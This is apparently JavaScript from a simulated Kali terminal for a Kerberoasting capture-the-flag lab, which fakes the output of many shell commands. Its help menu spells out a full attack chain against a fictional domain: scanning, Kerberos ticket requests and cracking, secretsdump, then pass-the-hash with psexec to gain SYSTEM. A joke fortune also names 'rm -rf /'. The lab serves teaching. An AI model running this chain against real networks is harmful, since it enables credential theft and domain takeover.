      return (arg.endsWith('.txt') || arg.endsWith('.kerberoast') || arg.startsWith('/usr/bin/')) ? 'g' : 'r';
    }}],
  },

  // ── wc ────────────────────────────────────────────────────────────────────
  {
    match: c => /^wc(\s|$)/.test(c),
    loadTime: (cmd) => cmd && cmd.includes('rockyou') ? jitter(600, 150) : jitter(120, 40),
    lines: [{ t: (cmd) => {
      const arg = cmd.replace(/^wc\s*/, '').trim();
      if (arg.includes('rockyou')) return '14344392  14344392 139921507 /usr/share/wordlists/rockyou.txt';
      if (arg.includes('.kerberoast')) return '      3       3    3241 hashes.kerberoast';
      if (arg.includes('notes')) return '      5      22     248 notes.txt';
      if (arg.includes('-l')) {
        if (arg.includes('rockyou')) return '14344392 /usr/share/wordlists/rockyou.txt';
        return '5';
      }
      return `      5      22     248 ${arg.split(' ').pop()}`;
    }}],
  },

  // ── head ─────────────────────────────────────────────────────────────────
  {
    match: c => /^head(\s|$)/.test(c),
    lines: [{ t: (cmd) => {
      const arg = cmd.replace(/^head\s+(-n\s*\d+\s+)?/, '').trim();
      const nMatch = cmd.match(/-n\s*(\d+)/);
      const n = nMatch ? parseInt(nMatch[1]) : 10;
      const files = { ...SIM.files };
      if (SIM.hashesOnDisk) files['/home/kali/hashes.kerberoast'] = KRB5_HASHES;
      const abs = arg.startsWith('/') ? arg : SIM.cwd.replace(/\/?$/,'/') + arg;
      const content = files[abs] || files['/home/kali/' + arg];
      if (content) return content.split('\n').slice(0, n).join('\n');
      return `head: cannot open '${arg}' for reading: No such file or directory`;
    }, cls: (cmd) => {
      const arg = cmd.replace(/^head\s+(-n\s*\d+\s+)?/, '').trim();
      const abs = arg.startsWith('/') ? arg : SIM.cwd.replace(/\/?$/,'/') + arg;
      const files = { ...SIM.files };
      if (SIM.hashesOnDisk) files['/home/kali/hashes.kerberoast'] = KRB5_HASHES;
      return (files[abs] || files['/home/kali/'+arg]) ? '' : 'r';
    }}],
  },

  // ── tail ─────────────────────────────────────────────────────────────────
  {
    match: c => /^tail(\s|$)/.test(c),
    lines: [{ t: (cmd) => {
      const arg = cmd.replace(/^tail\s+(-n\s*\d+\s+|-f\s+)?/, '').trim();
      const nMatch = cmd.match(/-n\s*(\d+)/);
      const n = nMatch ? parseInt(nMatch[1]) : 10;
      const files = { ...SIM.files };
      if (SIM.hashesOnDisk) files['/home/kali/hashes.kerberoast'] = KRB5_HASHES;
      const abs = arg.startsWith('/') ? arg : SIM.cwd.replace(/\/?$/,'/') + arg;
      const content = files[abs] || files['/home/kali/' + arg];
      if (content) {
        const lines = content.split('\n');
        if (cmd.includes('-f')) return lines.slice(-n).join('\n') + '\n(tail: following - press Ctrl+C to stop)';
        return lines.slice(-n).join('\n');
      }
      return `tail: cannot open '${arg}' for reading: No such file or directory`;
    }, cls: 'g'}],
  },

  // ── md5sum / sha1sum / sha256sum / sha512sum ──────────────────────────────
  {
    match: c => /^(md5sum|sha1sum|sha256sum|sha512sum)\s/.test(c),
    loadTime: (cmd) => cmd && cmd.includes('rockyou') ? jitter(2200, 400) : jitter(350, 100),
    lines: [{ t: (cmd) => {
      const tool = cmd.split(' ')[0];
      const arg  = cmd.replace(/^\S+\s+/, '').trim();
      const hashes = {
        'md5sum':    { 'notes.txt':'4b24ff9a7bea58d05f3b7a8ce35e1230', 'hashes.kerberoast':'9f3a8b2c1d4e5f6a7b8c9d0e1f2a3b4c' },
        'sha1sum':   { 'notes.txt':'a3f8d2c1b4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9', 'hashes.kerberoast':'1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b' },
        'sha256sum': { 'notes.txt':'a3f8d2c1b4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1', 'hashes.kerberoast':'b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6' },
        'sha512sum': { 'notes.txt':'a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4', 'hashes.kerberoast':'b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3' },
      };
      const name = arg.split('/').pop();
      const h = hashes[tool]?.[name] || Array.from({length: tool === 'sha512sum' ? 128 : tool === 'sha256sum' ? 64 : tool === 'sha1sum' ? 40 : 32}, () => '0123456789abcdef'[Math.floor(Math.random()*16)]).join('');
      const exists = SIM.files['/home/kali/'+name] || SIM.files['/root/'+name] || name === 'hashes.kerberoast';
      if (!exists) return `${tool}: ${arg}: No such file or directory`;
      return `${h}  ${arg}`;
    }, cls: 'g'}],
  },

  // ── base64 ────────────────────────────────────────────────────────────────
  {
    match: c => /^base64(\s|$)/.test(c),
    lines: [{ t: (cmd) => {
      if (cmd.includes('-d') || cmd.includes('--decode')) {
        const val = cmd.split(' ').pop();
        try { return atob(val); } catch { return `base64: invalid input`; }
      }
      const arg = cmd.replace(/^base64\s*/, '').trim();
      if (!arg) return `base64: extra operand`;
      const name = arg.split('/').pop();
      const content = SIM.files['/home/kali/'+name] || SIM.files[arg] || 'Hello World';
      return btoa(content).match(/.{1,76}/g).join('\n');
    }}],
  },

  // ── xxd ───────────────────────────────────────────────────────────────────
  {
    match: c => /^xxd(\s|$)/.test(c),
    lines: [{ t: (cmd) => {
      const arg = cmd.replace(/^xxd\s*/, '').trim();
      const name = arg.split('/').pop();
      const raw = SIM.files['/home/kali/'+name] || SIM.files[arg] || '';
      if (!raw && arg) return `xxd: ${arg}: No such file or directory`;
      const src = raw || '# Notes - DO NOT SHARE\n';
      const bytes = src.slice(0, 128);
      const lines = [];
      for (let i = 0; i < bytes.length; i += 16) {
        const chunk = bytes.slice(i, i+16);
        const hex = Array.from(chunk).map(c => c.charCodeAt(0).toString(16).padStart(2,'0')).join(' ');
        const asc = Array.from(chunk).map(c => { const code = c.charCodeAt(0); return (code >= 32 && code < 127) ? c : '.'; }).join('');
        lines.push(`${i.toString(16).padStart(8,'0')}: ${hex.padEnd(47)}  ${asc}`);
      }
      return lines.join('\n');
    }, cls: 'g'}],
  },

  // ── strings ───────────────────────────────────────────────────────────────
  {
    match: c => /^strings(\s|$)/.test(c),
    loadTime: () => jitter(300, 80),
    lines: [{ t: (cmd) => {
      const arg = cmd.replace(/^strings\s*/, '').trim();
      const name = arg.split('/').pop();
      const content = SIM.files['/home/kali/'+name] || SIM.files[arg];
      if (content) return content.split('\n').filter(l => l.trim()).join('\n');
      if (arg.startsWith('/usr/bin/') || arg.startsWith('/bin/')) return [
        '/lib64/ld-linux-x86-64.so.2',
        'libcrypto.so.3',
        'libc.so.6',
        'GLIBC_2.34',
        '__gmon_start__',
        'Usage: ' + arg.split('/').pop() + ' [options]',
        'Copyright (C) 2024',
        'Compiled with GCC 13.2.0',
      ].join('\n');
      return `strings: Warning: could not locate '${arg}'.  reason: No such file`;
    }}],
  },

  // ── openssl ───────────────────────────────────────────────────────────────
  {
    match: c => /^openssl(\s|$)/.test(c),
    loadTime: (cmd) => cmd && cmd.includes('s_client') ? jitter(1200, 300) : cmd && (cmd.includes('genrsa') || cmd.includes('genpkey')) ? jitter(800, 200) : jitter(150, 50),
    lines: [{ t: (cmd) => {
      if (cmd.includes('version')) return 'OpenSSL 3.1.5 30 Jan 2024 (Library: OpenSSL 3.1.5 30 Jan 2024)';
      if (cmd.includes('rand')) {
        const n = parseInt(cmd.match(/(\d+)/)?.[1] || '16');
        return Array.from({length:n}, () => Math.floor(Math.random()*256).toString(16).padStart(2,'0')).join('');
      }
      if (cmd.includes('genrsa') || cmd.includes('genpkey')) {
        return '-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEA2a2rwplBQLzHPZe5TSd39....\n[key truncated for display]\n-----END RSA PRIVATE KEY-----';
      }
      if (cmd.includes('s_client')) {
        const host = cmd.match(/(?:-connect\s+)?(\S+:\d+)/)?.[1] || '10.10.10.10:443';
        return `CONNECTED(00000003)\ndepth=0 CN = ${host.split(':')[0]}\nverify error:num=18:self-signed certificate\n---\nCertificate chain\n 0 s:CN = ${host.split(':')[0]}\n   i:CN = ${host.split(':')[0]}\n---\nSSL-Session:\n    Protocol  : TLSv1.3\n    Cipher    : TLS_AES_256_GCM_SHA384\n---`;
      }
      return 'openssl: Use openssl version, openssl rand <n>, openssl s_client -connect host:port';
    }}],
  },

  // ── gpg ───────────────────────────────────────────────────────────────────
  {
    match: c => /^gpg(\s|$)/.test(c),
    loadTime: (cmd) => cmd && (cmd.includes('--encrypt') || cmd.includes('-e') || cmd.includes('--decrypt') || cmd.includes('-d')) ? jitter(600, 150) : jitter(150, 50),
    lines: [{ t: (cmd) => {
      if (cmd.includes('--version')) return 'gpg (GnuPG) 2.4.3\nlibgcrypt 1.10.2\nCopyright (C) 2023 g10 Code GmbH\nLicense GNU GPL-3.0-or-later <https://gnu.org/licenses/gpl.html>';
      if (cmd.includes('--list-keys') || cmd.includes('-k')) return `/home/${SIM.user}/.gnupg/pubring.kbx\n-----------------------------------\npub   rsa4096 2024-01-10 [SC]\n      A1B2C3D4E5F6A7B8C9D0E1F2A3B4C5D6E7F8A9B0\nuid           [ultimate] Kali User <kali@kali.local>\nsub   rsa4096 2024-01-10 [E]`;
      if (cmd.includes('--encrypt') || cmd.includes('-e')) return 'gpg: ' + cmd.split(' ').pop() + '.gpg: encryption okay';
      if (cmd.includes('--decrypt') || cmd.includes('-d')) return 'gpg: AES256 encrypted data\ngpg: encrypted with 1 passphrase\n[decrypted content would appear here]';
      return 'gpg: no valid OpenPGP data found.';
    }}],
  },

  // ── ssh-keygen ────────────────────────────────────────────────────────────
  {
    match: c => /^ssh-keygen(\s|$)/.test(c),
    loadTime: () => jitter(400, 100),
    lines: [{ t: (cmd) => {
      if (cmd.includes('-l') || cmd.includes('--fingerprint')) {
        return `2048 SHA256:abc123def456xyz789 kali@kali (RSA)\n4096 SHA256:xyz789abc123def456 kali@kali (RSA)`;
      }
      const bits = cmd.match(/-b\s+(\d+)/)?.[1] || '4096';
      return [
        `Generating public/private ${cmd.includes('ed25519') ? 'ed25519' : 'rsa'} key pair.`,
        `Enter file in which to save the key (/home/${SIM.user}/.ssh/id_rsa): `,
        `Enter passphrase (empty for no passphrase): `,
        `Enter same passphrase again: `,
        `Your identification has been saved in /home/${SIM.user}/.ssh/id_rsa`,
        `Your public key has been saved in /home/${SIM.user}/.ssh/id_rsa.pub`,
        `The key fingerprint is:`,
        `SHA256:K1a2L3i4K5a6L7i8K9a0b1c2d3e4f5g6h7i8j9k0 ${SIM.user}@kali`,
        `The key's randomart image is:`,
        `+---[RSA ${bits}]----+`,
        `|  .   .          |`,
        `|   + . .  .      |`,
        `|  . B o o =      |`,
        `| . + * = = .     |`,
        `|  . = O S . .    |`,
        `|   . = = o   .   |`,
        `|    . o   o o .  |`,
        `|     . . . + . . |`,
        `|          +.o.+  |`,
        `+----[SHA256]-----+`,
      ].join('\n');
    }, cls: 'g'}],
  },

  // ── kill / killall / pkill / pgrep ────────────────────────────────────────
  {
    match: c => /^(kill|killall|pkill|pgrep)(\s|$)/.test(c),
    lines: [{ t: (cmd) => {
      const op = cmd.split(' ')[0];
      const target = cmd.split(' ').slice(1).join(' ').trim();
      if (!target) return `${op}: no process name specified`;
      if (op === 'pgrep') return `1234\n1338`;
      if (op === 'kill' && /^\d+$/.test(target)) {
        return parseInt(target) > 1500 ? `kill: (${target}): No such process` : '';
      }
      return '';
    }}],
  },

  // ── jobs / bg / fg ────────────────────────────────────────────────────────
  {
    match: c => /^(jobs|bg|fg)(\s|$)/.test(c),
    lines: [{ t: (cmd) => cmd === 'jobs' ? '' : `bash: ${cmd.split(' ')[0]}: current: no such job` }],
  },

  // ── strace ────────────────────────────────────────────────────────────────
  {
    match: c => /^strace(\s|$)/.test(c),
    loadTime: () => jitter(500, 150),
    lines: [{ t: (cmd) => {
      const prog = cmd.replace(/^strace\s+/, '').split(' ')[0];
      return [
        `execve("/usr/bin/${prog}", ["${prog}"], 0x7fffd4a3b890 /* 28 vars */) = 0`,
        `brk(NULL)                               = 0x555555771000`,
        `arch_prctl(0x3001 /* ARCH_??? */, 0x7ffd7e4b3d50) = -1 EINVAL (Invalid argument)`,
        `access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)`,
        `openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3`,
        `fstat(3, {st_mode=S_IFREG|0644, st_size=25893, ...}) = 0`,
        `mmap(NULL, 25893, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7f3a4b2c1000`,
        `close(3)                                = 0`,
        `openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3`,
        `--- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=1339, si_uid=1000, si_status=0, si_utime=0, si_stime=0} ---`,
        `+++ exited with 0 +++`,
      ].join('\n');
    }, cls: 'd'}],
  },

  // ── seq ───────────────────────────────────────────────────────────────────
  {
    match: c => /^seq\s/.test(c),
    lines: [{ t: (cmd) => {
      const args = cmd.replace(/^seq\s+/,'').trim().split(/\s+/).map(Number);
      let start, step, end;
      if (args.length === 1) { start = 1; step = 1; end = args[0]; }
      else if (args.length === 2) { start = args[0]; step = 1; end = args[1]; }
      else { start = args[0]; step = args[1]; end = args[2]; }
      if (isNaN(end) || Math.abs((end - start) / step) > 100) return '(seq: too many values)';
      const out = [];
      for (let i = start; step > 0 ? i <= end : i >= end; i += step) out.push(i);
      return out.join('\n');
    }}],
  },

  // ── cal ───────────────────────────────────────────────────────────────────
  {
    match: c => /^(cal|ncal)(\s|$)/.test(c),
    lines: [{ t: () => {
      const now = new Date();
      const year = now.getFullYear();
      const month = now.getMonth();
      const monthNames = ['January','February','March','April','May','June','July','August','September','October','November','December'];
      const firstDay = new Date(year, month, 1).getDay();
      const daysInMonth = new Date(year, month+1, 0).getDate();
      const today = now.getDate();
      let out = `   ${monthNames[month]} ${year}\nSu Mo Tu We Th Fr Sa\n`;
      let day = 1;
      let line = ' '.repeat(firstDay * 3);
      for (let i = firstDay; i < 7; i++, day++) {
        line += (day === today ? `\x1b[7m${String(day).padStart(2)}\x1b[0m` : String(day).padStart(2)) + ' ';
      }
      out += line.trimEnd() + '\n';
      while (day <= daysInMonth) {
        line = '';
        for (let i = 0; i < 7 && day <= daysInMonth; i++, day++) {
          line += (day === today ? `\x1b[7m${String(day).padStart(2)}\x1b[0m` : String(day).padStart(2)) + ' ';
        }
        out += line.trimEnd() + '\n';
      }
      return out;
    }}],
  },

  // ── bc ────────────────────────────────────────────────────────────────────
  {
    match: c => /^bc(\s|$)/.test(c),
    lines: [{ t: (cmd) => {
      const expr = cmd.replace(/^bc\s*(-l\s*)?/,'').trim();
      if (!expr) return 'bc 1.07.1 — An arbitrary precision calculator language\n(simulation: pass expression as argument, e.g. bc <<< "2^32")';
      try {
        // Very basic safe evaluation
        const safe = expr.replace(/[^0-9+\-*/().^% ]/g,'').replace(/\^/g,'**');
        const result = Function('"use strict"; return (' + safe + ')')();
        return String(result);
      } catch { return 'parse error'; }
    }}],
  },

  // ── factor ────────────────────────────────────────────────────────────────
  {
    match: c => /^factor(\s|$)/.test(c),
    lines: [{ t: (cmd) => {
      const n = parseInt(cmd.replace(/^factor\s*/,'').trim());
      if (isNaN(n) || n < 1 || n > 1e9) return isNaN(n) ? '' : 'factor: `' + cmd.split(' ').pop() + '\': argument is not a natural number or too large';
      let num = n, factors = [];
      for (let f = 2; f * f <= num; f++) { while (num % f === 0) { factors.push(f); num /= f; } }
      if (num > 1) factors.push(num);
      return `${n}: ${factors.join(' ')}`;
    }}],
  },

  // ── sort / uniq ───────────────────────────────────────────────────────────
  {
    match: c => /^(sort|uniq)(\s|$)/.test(c),
    lines: [{ t: (cmd) => {
      const arg = cmd.replace(/^\S+\s+(-\S+\s+)*/, '').trim();
      if (!arg) return '(reads from stdin — pipe or file required in simulation)';
      const name = arg.split('/').pop();
      const content = SIM.files['/home/kali/'+name] || SIM.files[arg] || '';
      if (!content) return `sort: cannot read: ${arg}: No such file or directory`;
      const lines = content.split('\n').filter(Boolean);
      if (cmd.startsWith('uniq')) return [...new Set(lines)].join('\n');
      return [...lines].sort().join('\n');
    }}],
  },

  // ── cut ───────────────────────────────────────────────────────────────────
  {
    match: c => /^cut\s/.test(c),
    lines: [{ t: (cmd) => {
      const fMatch = cmd.match(/-f\s*(\d+)/);
      const dMatch = cmd.match(/-d\s*['"]?([^'"s\s])['"]?/);
      const f = fMatch ? parseInt(fMatch[1]) - 1 : 0;
      const d = dMatch ? dMatch[1] : '\t';
      const arg = cmd.split(' ').pop();
      const content = SIM.files['/home/kali/'+arg.split('/').pop()] || '';
      if (!content) return `cut: ${arg}: No such file or directory`;
      return content.split('\n').map(l => l.split(d)[f] || '').filter(Boolean).join('\n');
    }}],
  },

  // ── awk ───────────────────────────────────────────────────────────────────
  {
    match: c => /^awk\s/.test(c),
    lines: [{ t: (cmd) => {
      if (cmd.includes('{print $')) {
        const fMatch = cmd.match(/\{print\s+\$(\d+)\}/);
        const f = fMatch ? parseInt(fMatch[1]) - 1 : 0;
        const fileArg = cmd.split(' ').pop();
        const content = SIM.files['/home/kali/' + fileArg.split('/').pop()] || '';
        if (content) return content.split('\n').map(l => l.split(/\s+/)[f] || '').filter(Boolean).join('\n');
      }
      if (cmd.includes('NR')) return '5';
      return '(awk: complex patterns not simulated)';
    }}],
  },

  // ── sed ───────────────────────────────────────────────────────────────────
  {
    match: c => /^sed\s/.test(c),
    lines: [{ t: (cmd) => {
      const sMatch = cmd.match(/s\/([^\/]+)\/([^\/]*)\/g?/);
      if (!sMatch) return '(sed: expression not recognized)';
      const fileArg = cmd.split(' ').pop();
      const content = SIM.files['/home/kali/' + fileArg.split('/').pop()] || '';
      if (!content) return `(reading stdin: pipe required in simulation)`;
      const re = new RegExp(sMatch[1], 'g');
      return content.replace(re, sMatch[2]);
    }}],
  },

  // ── tr ────────────────────────────────────────────────────────────────────
  {
    match: c => /^tr\s/.test(c),
    lines: [{ t: () => '(tr: pipe or stdin required in simulation)' }],
  },

  // ── diff ─────────────────────────────────────────────────────────────────
  {
    match: c => /^diff\s/.test(c),
    lines: [{ t: (cmd) => {
      const args = cmd.split(' ').slice(1);
      if (args[0] === args[1]) return '';
      return `--- ${args[0]}\n+++ ${args[1]}\n@@ -1,3 +1,3 @@\n-line 1 of ${args[0]}\n+line 1 of ${args[1]}`;
    }}],
  },

  // ── tee ───────────────────────────────────────────────────────────────────
  {
    match: c => /\|\s*tee\s+\S+/.test(c),
    lines: [{ t: (cmd) => {
      const outFile = cmd.match(/tee\s+(\S+)/)?.[1];
      return outFile ? `(output duplicated to ${outFile})` : '';
    }, cls: 'd'}],
  },

  // ── xargs ─────────────────────────────────────────────────────────────────
  {
    match: c => /\|\s*xargs\s+\S+/.test(c),
    lines: [{ t: () => '(xargs: executing against each item)' }],
  },

  // ── sleep ─────────────────────────────────────────────────────────────────
  {
    match: c => /^sleep\s/.test(c),
    loadTime: () => jitter(800, 200),
    lines: [{ t: () => '' }],
  },

  // ── yes ───────────────────────────────────────────────────────────────────
  {
    match: c => /^yes(\s|$)/.test(c),
    lines: [{ t: (cmd) => {
      const val = cmd.replace(/^yes\s*/,'') || 'y';
      return Array(20).fill(val).join('\n') + '\n(^C to stop)';
    }, cls: 'd'}],
  },

  // ── printf ────────────────────────────────────────────────────────────────
  {
    match: c => /^printf\s/.test(c),
    lines: [{ t: (cmd) => cmd.replace(/^printf\s+/,'').replace(/^(['"])(.*)\1$/, '$2').replace(/\\n/g,'\n').replace(/\\t/g,'\t') }],
  },

  // ── alias ─────────────────────────────────────────────────────────────────
  {
    match: c => /^alias(\s|$)/.test(c),
    lines: [{ t: (cmd) => {
      if (cmd === 'alias') return [
        "alias cls='clear'",
        "alias grep='grep --color=auto'",
        "alias l='ls -CF'",
        "alias la='ls -A'",
        "alias ll='ls -alF'",
        "alias ls='ls --color=auto'",
        "alias python='python3'",
      ].join('\n');
      return '';  // silent success for setting aliases
    }}],
  },

  // ── type ─────────────────────────────────────────────────────────────────
  {
    match: c => /^type\s/.test(c),
    lines: [{ t: (cmd) => {
      const tool = cmd.replace(/^type\s+/, '').trim();
      const builtins = new Set(['cd','echo','exit','export','alias','type','pwd','history','jobs','bg','fg','source']);
      if (builtins.has(tool)) return `${tool} is a shell builtin`;
      const paths = { ls:'/usr/bin/ls', cat:'/usr/bin/cat', grep:'/usr/bin/grep', nmap:'/usr/bin/nmap', python3:'/usr/bin/python3', bash:'/usr/bin/bash', ssh:'/usr/bin/ssh', curl:'/usr/bin/curl', john:'/usr/sbin/john', hashcat:'/usr/bin/hashcat', crackmapexec:'/usr/bin/crackmapexec', enum4linux:'/usr/bin/enum4linux' };
      if (paths[tool]) return `${tool} is ${paths[tool]}`;
      return `${tool}: not found`;
    }, cls: (cmd) => {
      const t = cmd.replace(/^type\s+/,'').trim();
      return ['ls','cat','grep','nmap','bash','john','hashcat'].includes(t) ? 'g' : 'r';
    }}],
  },

  // ── export ────────────────────────────────────────────────────────────────
  {
    match: c => /^export(\s|$)/.test(c),
    lines: [{ t: (cmd) => {
      if (cmd === 'export') return [
        'declare -x HOME="/home/kali"',
        'declare -x LANG="en_US.UTF-8"',
        'declare -x LOGNAME="kali"',
        'declare -x PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"',
        'declare -x PWD="/home/kali"',
        'declare -x SHELL="/bin/bash"',
        'declare -x TERM="xterm-256color"',
        `declare -x USER="${SIM.user}"`,
      ].join('\n');
      return '';  // silent
    }}],
  },

  // ── ulimit ────────────────────────────────────────────────────────────────
  {
    match: c => /^ulimit(\s|$)/.test(c),
    lines: [{ t: (cmd) => {
      if (cmd.includes('-a') || cmd === 'ulimit') return [
        'core file size          (blocks, -c) 0',
        'data seg size           (kbytes, -d) unlimited',
        'scheduling priority             (-e) 0',
        'file size               (blocks, -f) unlimited',
        'pending signals                 (-i) 62756',
        'max locked memory       (kbytes, -l) 8388608',
        'max memory size         (kbytes, -m) unlimited',
        'open files                      (-n) 1048576',
        'pipe size            (512 bytes, -p) 8',
        'POSIX message queues     (bytes, -q) 819200',
        'real-time priority              (-r) 0',
        'stack size              (kbytes, -s) 8192',
        'cpu time               (seconds, -t) unlimited',
        'max user processes              (-u) 62756',
        'virtual memory          (kbytes, -v) unlimited',
        'file locks                      (-x) unlimited',
      ].join('\n');
      if (cmd.includes('-n')) return '1048576';
      return 'unlimited';
    }}],
  },

  // ── mount ────────────────────────────────────────────────────────────────
  {
    match: c => c === 'mount' || /^mount\s+-l/.test(c),
    lines: [
      { t: 'sysfs on /sys type sysfs (rw,nosuid,nodev,noexec,relatime)' },
      { t: 'proc on /proc type proc (rw,nosuid,nodev,noexec,relatime)' },
      { t: 'devtmpfs on /dev type devtmpfs (rw,nosuid,size=4096k,nr_inodes=4096,mode=755)' },
      { t: '/dev/sda1 on / type ext4 (rw,relatime,errors=remount-ro)', cls: 'g' },
      { t: 'tmpfs on /dev/shm type tmpfs (rw,nosuid,nodev)' },
      { t: 'tmpfs on /run type tmpfs (rw,nosuid,nodev,noexec,relatime,size=1630892k,mode=755)' },
      { t: '/dev/sda2 on /home type ext4 (rw,relatime)', cls: 'g' },
      { t: 'tmpfs on /tmp type tmpfs (rw,nosuid,nodev)' },
      { t: 'tmpfs on /run/user/1000 type tmpfs (rw,nosuid,nodev,relatime,size=1630888k,nr_inodes=407722,mode=700,uid=1000,gid=1000)' },
    ],
  },

  // ── cowsay ───────────────────────────────────────────────────────────────
  {
    match: c => /^cowsay(\s|$)/.test(c),
    lines: [{ t: (cmd) => {
      const msg = cmd.replace(/^cowsay\s*/,'').trim() || 'moo';
      const line = '-'.repeat(msg.length + 2);
      return [
        ` ${line}`,
        `< ${msg} >`,
        ` ${line}`,
        '        \\   ^__^',
        '         \\  (oo)\\_______',
        '            (__)\\       )\\/\\',
        '                ||----w |',
        '                ||     ||',
      ].join('\n');
    }, cls: 'g'}],
  },

  // ── fortune ───────────────────────────────────────────────────────────────
  {
    match: c => /^fortune(\s|$)/.test(c),
    lines: [{ t: () => {
      const fortunes = [
        'Security is a process, not a product.\n\t-- Bruce Schneier',
        'The only truly secure system is one that is powered off, cast in a block of concrete and sealed in a lead-lined room with armed guards.\n\t-- Gene Spafford',
        'Hackers are breaking the systems for profit. Before, it was about intellectual curiosity and pursuit of knowledge and thrill, and now hacking is big business.\n\t-- Kevin Mitnick',
        'There are two types of companies: those that have been hacked, and those who don\'t know they have been hacked.\n\t-- John Chambers',
        'Kerberoasting: because any domain user can request TGS tickets, and humans pick terrible passwords.',
        'The quieter you become, the more you are able to hear... the LDAP queries.',
        'rm -rf / : because sometimes you need to start over.',
        'There\'s no patch for human stupidity.\n\t-- (unknown)',
        'Never underestimate the bandwidth of a station wagon full of tapes hurtling down the highway.\n\t-- Andrew Tanenbaum',
      ];
      return fortunes[Math.floor(Math.random() * fortunes.length)];
    }, cls: 'y'}],
  },

  // ── sl (steam locomotive Easter egg) ─────────────────────────────────────
  {
    match: c => c === 'sl' || c === 'sl -al',
    loadTime: () => jitter(2500, 400),
    lines: [
      { t: '                      (  ) (@@) ( )  (@)  ()    @@    O     @     O     @      O' },
      { t: '               (@@@)' },
      { t: '           (    )' },
      { t: '        (@@@@)' },
      { t: '     (   )' },
      { t: '                   |\\      _,,,---,,_' },
      { t: "                   /,`.-'`'    -.  ;-;;,_" },
      { t: '                  |,4-  ) )-,_..;\\ (  `\'-\'' },
      { t: "                 '---''(_/--'  `-'\\_)" },
      { t: '' },
      { t: '   ====        ________                ___________', cls: 'y' },
      { t: '  _D _|  |_______/        \\__I_I_____===__|_________|', cls: 'y' },
      { t: '   |(_)---  |   H\\________/ |   |        =|___ ___|', cls: 'y' },
      { t: '   /     |  |   H  |  |     |   |         ||_| |_||', cls: 'y' },
      { t: '  |      |  |   H  |__--------------------| [___] |', cls: 'y' },
      { t: '  | ________|___H__/__|_____/[][]~\\_______|       |', cls: 'y' },
      { t: '  |/ |   |-----------I_____I [][] []  D   |=======|--', cls: 'y' },
      { t: '__/ =| o |=-~~\\  /~~\\  /~~\\  /~~\\ ____Y___________|__', cls: 'r' },
      { t: ' |/-=|___|=   O=====O=====O=====O|_____/~\\___/        ', cls: 'r' },
      { t: '  \\_/      \\__/  \\__/  \\__/  \\__/      \\_/            ', cls: 'r' },
      { t: '' },
      { t: 'sl: command not found — but you found the Easter egg!', cls: 'd' },
    ],
  },

  // ── Windows shell extras ──────────────────────────────────────────────────

  // ── Help / misc ───────────────────────────────────────────────────────────
  {
    match: c => c === 'help' || c === 'help --ctf',
    lines: [
      { t: '┌─────────────────────────────────────────────────────┐', cls: 'p' },
      { t: '│         Kerberoasting CTF Lab — Quick Reference       │', cls: 'p' },
      { t: '└─────────────────────────────────────────────────────┘', cls: 'p' },
      { t: '' },
      { t: 'STEP 1  sudo nmap -sn 10.10.10.0/24', cls: 'c' },
      { t: 'STEP 2  sudo nmap -sV -sC 10.10.10.10', cls: 'c' },
      { t: 'STEP 3  enum4linux -a 10.10.10.10', cls: 'c' },
      { t: 'STEP 4  cat /home/kali/notes.txt', cls: 'c' },
      { t: '        crackmapexec smb 10.10.10.10 -u john.doe -p \'Password1!\'', cls: 'c' },
      { t: 'STEP 5  impacket-GetUserSPNs CORP.LOCAL/john.doe:\'Password1!\' -dc-ip 10.10.10.10', cls: 'c' },
      { t: 'STEP 6  impacket-GetUserSPNs CORP.LOCAL/john.doe:\'Password1!\' -dc-ip 10.10.10.10 -request -outputfile hashes.kerberoast', cls: 'c' },
      { t: 'STEP 7  john hashes.kerberoast --wordlist=/usr/share/wordlists/rockyou.txt', cls: 'c' },
      { t: '        john hashes.kerberoast --show', cls: 'c' },
      { t: 'STEP 8  crackmapexec smb 10.10.10.10 -u svc_backup -p \'Backup2023!\'', cls: 'c' },
      { t: 'STEP 9  impacket-secretsdump CORP.LOCAL/svc_backup:\'Backup2023!\'@10.10.10.10', cls: 'c' },
      { t: 'STEP 10 crackmapexec smb 10.10.10.10 -u Administrator -H fc525c9683e8fe067095ba2ddc971889', cls: 'c' },
      { t: '        impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889 CORP.LOCAL/Administrator@10.10.10.10', cls: 'c' },
      { t: '' },
      { t: 'Type  help  again to see this menu. See WALKTHROUGH.md for full explanations.', cls: 'd' },
    ],
  },

];

// ── Dispatcher ────────────────────────────────────────────────────────────────
function runCommand(rawInput) {
  const cmd = rawInput.trim().replace(/\s+/g, ' ');
  if (!cmd) return null;

  // Windows shell mode (after psexec)
  if (SIM.windowsShell) {
    if (cmd === 'exit') { SIM.windowsShell = false; return { lines: [{ t: '' }] }; }
    if (cmd === 'whoami') return { lines: [{ t: 'nt authority\\system', cls: 'g' }] };
    if (cmd === 'whoami /priv') return { lines: [
      { t: 'PRIVILEGES INFORMATION' }, { t: '----------------------' }, { t: '' },
      { t: 'Privilege Name                  Description                         State', cls: 'b' },
      { t: '=============================== =================================== =======', cls: 'd' },
      { t: 'SeAssignPrimaryTokenPrivilege   Replace a process level token       Enabled', cls: 'g' },
      { t: 'SeTcbPrivilege                  Act as part of the operating system Enabled', cls: 'g' },
